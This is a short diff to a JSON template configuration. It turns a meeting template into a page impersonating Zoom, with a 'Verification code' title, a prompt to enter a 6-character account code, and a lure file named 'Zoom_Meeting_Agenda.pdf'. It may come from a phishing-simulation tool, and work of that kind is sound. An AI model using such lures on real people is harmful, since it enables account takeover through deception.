@@ -5,9 +5,27 @@
   "fields": [
     {
       "key": "title",
-      "label": "Meeting Title",
+      "label": "Page Title",
       "type": "text",
-      "default": "Team Standup Meeting"
+      "default": "Zoom · Verification code"
+    },
+    {
+      "key": "message",
+      "label": "Page Message",
+      "type": "text",
+      "default": "To verify your identity, enter the 6-character code below to connect to your account."
+    },
+    {
+      "key": "button_text",
+      "label": "Button Text",
+      "type": "text",
+      "default": "Get verification code"
+    },
+    {
+      "key": "file_name",
+      "label": "File Name",
+      "type": "text",
+      "default": "Zoom_Meeting_Agenda.pdf"
     },
     {
       "key": "pages",
